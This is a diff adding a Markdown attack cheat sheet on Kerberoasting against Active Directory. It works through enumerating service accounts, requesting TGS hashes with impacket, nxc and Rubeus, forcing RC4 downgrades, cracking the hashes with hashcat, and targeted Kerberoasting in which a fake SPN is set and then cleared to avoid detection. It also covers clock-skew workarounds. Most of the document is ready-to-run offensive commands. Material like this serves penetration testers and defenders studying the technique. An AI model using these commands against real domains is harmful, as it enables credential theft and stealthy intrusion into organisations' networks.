@@ -1,0 +1,123 @@
+# Kerberoasting
+
+Any authenticated domain user can request a TGS (service ticket) for any account with a registered SPN. The KDC encrypts part of the TGS with the service account's NTLM hash: take that ticket offline and crack the hash without further interaction with the domain.
+
+## How It Works
+
+Normal TGS flow:
+
+```
+1. Client → KDC: "I want a ticket for service X" (TGS-REQ)
+                  includes their TGT as proof of identity
+2. KDC → Client: TGS ticket encrypted with the SERVICE ACCOUNT'S NTLM hash
+3. Client → Service: presents the TGS ticket
+```
+
+The problem: any authenticated domain user can request a TGS for any SPN. The KDC does not check whether you actually need to access the service.
+
+Since the TGS is encrypted with the service account's hash, you take it offline and crack it:
+
+```
+authenticated user → request TGS for SPN → get $krb5tgs$ blob → crack offline → plaintext password
+```
+
+## Why It Works
+
+- SPNs identify service accounts (e.g. `MSSQLSvc/db.domain.local:1433`)
+- The TGS is encrypted with RC4-HMAC (etype 23) or AES256 (etype 18) using the service account's password hash
+- No special privileges required: any domain user can request tickets
+- RC4 hashes crack significantly faster than AES256
+
+## Finding Kerberoastable Accounts
+
+Look for user accounts (not computer accounts) with SPNs: service accounts are the target, especially ones that look like they have weak passwords.
+
+```powershell
+# PowerView
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, description
+
+# setspn (built-in)
+setspn -T $DOMAIN -Q */*
+```
+
+```bash
+# impacket: list without requesting
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+
+# nxc
+nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --kerberoast output.txt
+```
+
+## Requesting Hashes
+
+Request the TGS and save hashes for offline cracking.
+
+```bash
+# impacket: request all Kerberoastable hashes
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.txt
+
+# Request for a specific account
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET -outputfile hashes.txt
+```
+
+```powershell
+# Rubeus: all accounts
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Rubeus: specific account
+Rubeus.exe kerberoast /user:$TARGET /outfile:hashes.txt
+
+# Force RC4 (faster to crack: downgrade if AES is returned)
+Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes.txt
+```
+
+## Cracking
+
+RC4 hashes (etype 23, `$krb5tgs$23$*`) crack much faster than AES256: try to force RC4 with `/tgtdeleg` if the service account is RC4 capable.
+
+```bash
+# RC4 (etype 23): hashcat mode 13100
+hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
+hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou -r /usr/share/hashcat/rules/best64.rule
+
+# AES256 (etype 18): hashcat mode 19700
+hashcat -m 19700 hashes.txt ~/tools/wordlists/rockyou
+```
+
+## Targeted Kerberoasting
+
+If you have `GenericWrite` on a user account, you can set an SPN on it, request the TGS, then clean up. Useful for accounts that do not normally have SPNs.
+
+```powershell
+# Step 1: Set a fake SPN on the target account
+Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
+
+# Verify it was set
+Get-DomainUser $TARGET | Select-Object serviceprincipalname
+```
+
+```bash
+# Step 2: Request the TGS
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET -outputfile targeted.txt
+```
+
+```powershell
+# Step 3: Clean up (remove SPN to avoid detection)
+Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
+```
+
+## Clock Skew (faketime)
+
+Kerberos requires your clock to be within 5 minutes of the DC. If you get `KRB_AP_ERR_SKEW`, use `faketime` to offset your system time for the duration of the command without actually changing your clock.
+
+```bash
+# Check the DC's current time
+nmap -sV --script=clock-skew $DC_IP
+
+# Run any command with a time offset
+faketime -f '+7h' GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.txt
+faketime -f '+7h' nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --kerberoast hashes.txt
+
+# Negative offset (your clock is ahead of the DC)
+faketime -f '-3h' GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.txt
+```
